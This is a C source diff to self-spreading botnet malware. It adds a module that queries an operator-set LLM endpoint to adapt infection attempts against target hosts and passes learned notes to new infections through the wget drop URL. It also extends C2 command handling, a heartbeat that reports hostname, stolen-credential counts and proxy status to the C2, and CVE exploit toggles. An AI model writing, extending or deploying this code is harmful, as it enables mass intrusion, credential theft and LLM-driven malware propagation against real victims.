@@ -1329,6 +1329,26 @@ int build_drop_url(notnet_bot_t *bot, char *dl_url, size_t sz) {
             if (qlen > 0 && (size_t)qlen < sizeof(q) &&
                 n + (size_t)qlen < sz) {
                 memcpy(dl_url + n, q, (size_t)qlen + 1);
+                /* #401: Lamarckian inheritance — append the parent's
+                 * learned notes so the daughter boots adapted, not
+                 * cold. Only when ARA is enabled and notes exist; the
+                 * blob is already ':'- and control-char-free. The
+                 * victim wget runs it inside a quoted shell string in
+                 * every spreader, so '~' is safe. */
+                if (bot->ara.enabled) {
+                    char blob[ARA_NOTES_MAX_LINES * ARA_NOTE_MAX_LEN + 32];
+                    int bl = ara_notes_blob(blob, sizeof(blob));
+                    if (bl > 0) {
+                        int used = n + (size_t)qlen;
+                        char aq[ARA_NOTES_MAX_LINES * ARA_NOTE_MAX_LEN + 48];
+                        int alen = snprintf(aq, sizeof(aq), "&notes=%s", blob);
+                        if (alen > 0 && used + (size_t)alen < sz) {
+                            memcpy(dl_url + used, aq, (size_t)alen + 1);
+                            log_info("SPREAD: drop URL carries %d parent notes (gen %d)",
+                                     ara_note_count(), ara_generation());
+                        }
+                    }
+                }
                 return 0;
             }
         }
@@ -1414,6 +1434,78 @@ int http_read(notnet_bot_t *bot, char *buf, int len) {
         }
     }
     return received;
+}
+
+/* One-shot POST of a JSON body to an arbitrary http(s) URL and read
+ * the response. #401: used by the ARA module to call the
+ * operator-configured LLM endpoint (OpenAI-compatible
+ * /v1/chat/completions). Unlike http_post (which rides the connected
+ * C2 channel), this dials url directly via the same
+ * http_connect_url helper as the GET fetches — so https works under
+ * the same tls_cert_pin contract, and the fleet secret is NEVER sent
+ * to a foreign host (only an optional bearer api_key the operator
+ * configured for their own LLM).
+ * Returns the response length (>0) on success, -1 on failure. */
+int http_post_to_url(notnet_bot_t *bot, const char *url, const char *bearer,
+                     const char *body, char *resp, size_t resp_sz) {
+    if (!bot || !url || !body || !resp || resp_sz == 0) return -1;
+    if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
+        log_warn("HTTP: http_post_to_url requires an http:// or https:// URL");
+        return -1;
+    }
+    char host[256];
+    uint16_t port = 0;
+    char path[512];
+    notnet_tls_t tls;
+    tls.enabled = 0; tls.ssl = NULL; tls.sock = -1;
+    int sock = http_connect_url(bot, url, host, sizeof(host), &port,
+                                path, sizeof(path), &tls);
+    if (sock < 0) {
+        log_warn("HTTP: http_post_to_url connect to %s failed: %s", url, strerror(errno));
+        return -1;
+    }
+
+    char hdr[640];
+    int hlen = snprintf(hdr, sizeof(hdr),
+        "POST %s HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "Content-Type: application/json\r\n"
+        "User-Agent: %s\r\n"
+        "%s%s%s"
+        "Content-Length: %zu\r\n"
+        "Connection: close\r\n"
+        "\r\n",
+        path, host, bot->c2_http.user_agent,
+        bearer && bearer[0] ? "Authorization: Bearer " : "",
+        bearer && bearer[0] ? bearer : "",
+        bearer && bearer[0] ? "\r\n" : "",
+        strlen(body));
+    if (hlen < 0 || (size_t)hlen >= sizeof(hdr)) { close(sock); return -1; }
+
+    int sent = chan_send(&tls, sock, hdr, (size_t)hlen);
+    if (sent > 0) sent = chan_send(&tls, sock, body, strlen(body));
+    if (sent < 0) { close(sock); return -1; }
+
+    int total = 0;
+    while (total < (int)resp_sz - 1) {
+        fd_set rfds;
+        struct timeval tv;
+        FD_ZERO(&rfds);
+        FD_SET(sock, &rfds);
+        tv.tv_sec = 15;
+        tv.tv_usec = 0;
+        if (select(sock + 1, &rfds, NULL, NULL, &tv) <= 0) break;
+        int recvd = chan_recv(&tls, sock, resp + total, (int)resp_sz - 1 - total);
+        if (recvd <= 0) break;
+        total += recvd;
+    }
+    resp[total] = '\0';
+    close(sock);
+    if (total <= 0) {
+        log_warn("HTTP: http_post_to_url empty response from %s", url);
+        return -1;
+    }
+    return total;
 }
 
 /* Open a fresh blocking TCP connection to host:port with a 3s timeout.
@@ -3982,6 +4074,72 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 protocol_send_response(bot, CMD_CVE,
                     "cve: usage 'cve list' | 'cve enable <id>' | 'cve disable <id>' | 'cve status <ip>'");
             }
+        } else if (strncmp(cmd, CMD_ARA, strlen(CMD_ARA)) == 0) {
+            /* #401: Adaptive Replication Agent control.
+             *   ara status                     — gen/notes/r0/llm
+             *   ara notes                      — dump learned notes
+             *   ara adapt <ip:port> [error]    — force an LLM adapt call
+             *   ara r0 <infections> <quarant>  — feed the R0 estimator */
+            char *args = cmd + strlen(CMD_ARA);
+            while (*args == ' ' || *args == '\t') args++;
+            char rbuf[1024];
+            if (args[0] == '\0' || strcmp(args, "status") == 0) {
+                char st[64];
+                ara_status_render(st, sizeof(st));
+                snprintf(rbuf, sizeof(rbuf),
+                         "ara: enabled=%d url=%.64s model=%.32s | %s",
+                         bot->ara.enabled,
+                         bot->ara.url[0] ? bot->ara.url : "(none)",
+                         bot->ara.model[0] ? bot->ara.model : "(default)",
+                         st);
+                protocol_send_response(bot, CMD_ARA, rbuf);
+            } else if (strcmp(args, "notes") == 0) {
+                /* Notes can total ~3KB; the response path caps at ~1KB,
+                 * so render a bounded head (newest lines first are not
+                 * tracked, so just take what fits) and say how many were
+                 * omitted. */
+                char notes[ARA_NOTES_MAX_LINES * ARA_NOTE_MAX_LEN + 32];
+                ara_notes_render(notes, sizeof(notes));
+                if (strlen(notes) > 900) {
+                    notes[900] = '\0';
+                    snprintf(rbuf, sizeof(rbuf), "ara notes (gen %d, truncated):\n%s...",
+                             ara_generation(), notes);
+                } else {
+                    snprintf(rbuf, sizeof(rbuf), "ara notes (gen %d):\n%s",
+                             ara_generation(), notes[0] ? notes : "(none)");
+                }
+                protocol_send_response(bot, CMD_ARA, rbuf);
+            } else if (strncmp(args, "adapt ", 6) == 0) {
+                char tip[64] = {0};
+                char err[160] = "operator-forced adapt";
+                /* adapt <ip:port> [free-text error] */
+                if (sscanf(args + 6, "%63s", tip) != 1) {
+                    protocol_send_response(bot, CMD_ARA,
+                        "ara: usage 'ara adapt <ip:port> [error]'");
+                } else {
+                    const char *sp = strchr(args + 6, ' ');
+                    if (sp && sp[1]) snprintf(err, sizeof(err), "%s", sp + 1);
+                    const char *arch = arch_detect(tip, 80, NULL, 0);
+                    int rc = ara_adapt(bot, &bot->ara, tip, arch, err);
+                    snprintf(rbuf, sizeof(rbuf),
+                             rc == 0 ? "ara: adapted (gen %d, %d notes)"
+                                     : "ara: adapt failed (disabled or llm unreachable)",
+                             ara_generation(), ara_note_count());
+                    protocol_send_response(bot, CMD_ARA, rbuf);
+                }
+            } else if (strncmp(args, "r0 ", 3) == 0) {
+                int inf = 0, quar = 0;
+                if (sscanf(args + 3, "%d %d", &inf, &quar) == 2) {
+                    ara_update_r0(inf, quar);
+                    snprintf(rbuf, sizeof(rbuf), "ara: r0 set -> %d/100", ara_r0_x100());
+                } else {
+                    snprintf(rbuf, sizeof(rbuf), "ara: usage 'ara r0 <infections> <quarantines>'");
+                }
+                protocol_send_response(bot, CMD_ARA, rbuf);
+            } else {
+                protocol_send_response(bot, CMD_ARA,
+                    "ara: usage 'ara status' | 'ara notes' | 'ara adapt <ip:port> [error]' | 'ara r0 <i> <q>'");
+            }
         } else if (strncmp(cmd, CMD_ROTATE, strlen(CMD_ROTATE)) == 0) {
             /* SECURITY FIX (#93): manual C2 rotation — advance the
              * disposable-infrastructure chain immediately. Operator
@@ -4107,6 +4265,11 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
     /* CVE ids + counter kinds are compile-time constants — nothing to
      * JSON-escape. */
 
+    /* #401: ARA lineage telemetry — "gen=N notes=N r0=X adapted=0/1".
+     * Empty when the module never loaded notes (cold, disabled). */
+    char ara_stats[64];
+    ara_status_render(ara_stats, sizeof(ara_stats));
+
     char heartbeat[2048];
     /* SECURITY FIX (#89): report proxy status so the C2 can build a
      * residential-proxy inventory (on/off + bound port).
@@ -4116,10 +4279,10 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
      * (#93): report the affiliate/operator tag so the C2 can attribute
      * bots to affiliates (per-affiliate inventory + teardown). */
     int ret = snprintf(heartbeat, sizeof(heartbeat),
-        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d,\"relay_on\":%d,\"relay_port\":%d,\"tag\":\"%s\",\"cve_stats\":\"%s\"}",
+        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d,\"relay_on\":%d,\"relay_port\":%d,\"tag\":\"%s\",\"cve_stats\":\"%s\",\"ara\":\"%s\"}",
         NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count,
         spread_cred_count(), safe_secret, proxy_is_running() ? 1 : 0, proxy_get_port(),
-        relay_is_running() ? 1 : 0, relay_get_port(), safe_tag, cve_stats);
+        relay_is_running() ? 1 : 0, relay_get_port(), safe_tag, cve_stats, ara_stats);
     if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
         log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
     }
@@ -4996,6 +5159,27 @@ int load_config(notnet_bot_t *bot, const char *path) {
              * callback reports that BYOVD-style driver abuse is
              * blocked. */
             bot->byovd_guard = (atoi(value) != 0);
+        } else if (strcmp(key, "ara_enabled") == 0) {
+            /* #401: Adaptive Replication Agent master switch. */
+            bot->ara.enabled = (atoi(value) != 0);
+        } else if (strcmp(key, "ara_llm_url") == 0) {
+            strncpy(bot->ara.url, value, sizeof(bot->ara.url) - 1);
+            bot->ara.url[sizeof(bot->ara.url) - 1] = '\0';
+        } else if (strcmp(key, "ara_llm_model") == 0) {
+            strncpy(bot->ara.model, value, sizeof(bot->ara.model) - 1);
+            bot->ara.model[sizeof(bot->ara.model) - 1] = '\0';
+        } else if (strcmp(key, "ara_llm_key") == 0) {
+            strncpy(bot->ara.api_key, value, sizeof(bot->ara.api_key) - 1);
+            bot->ara.api_key[sizeof(bot->ara.api_key) - 1] = '\0';
+        } else if (strcmp(key, "ara_llm_sysprompt") == 0) {
+            strncpy(bot->ara.sys_prompt, value, sizeof(bot->ara.sys_prompt) - 1);
+            bot->ara.sys_prompt[sizeof(bot->ara.sys_prompt) - 1] = '\0';
+        } else if (strcmp(key, "ara_llm_userprompt") == 0) {
+            strncpy(bot->ara.user_prompt, value, sizeof(bot->ara.user_prompt) - 1);
+            bot->ara.user_prompt[sizeof(bot->ara.user_prompt) - 1] = '\0';
+        } else if (strcmp(key, "ara_notes_dir") == 0) {
+            strncpy(bot->ara_notes_dir, value, sizeof(bot->ara_notes_dir) - 1);
+            bot->ara_notes_dir[sizeof(bot->ara_notes_dir) - 1] = '\0';
         } else if (strncmp(key, "c2_backup_", 10) == 0) {
             /* SECURITY FIX (#93): disposable-infrastructure backup
              * endpoints, c2_backup_<n> = host:port with n in 1..4.
